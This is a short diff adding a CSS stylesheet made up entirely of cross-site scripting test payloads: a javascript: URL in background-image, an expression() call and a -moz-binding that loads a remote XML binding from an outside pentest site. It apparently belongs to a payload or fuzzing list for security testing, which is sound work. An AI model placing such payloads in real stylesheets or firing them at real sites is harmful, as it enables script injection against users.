@@ -1,0 +1,6 @@
+body {
+  background-image: url('javascript:alert("XSS");');
+  background-image: expression(alert('XSS'));
+  -moz-binding:url("http://yehg.net/lab/pr0js/pentest/wordlists/injections/xss_files/xssmoz.xml#xss");
+}
+
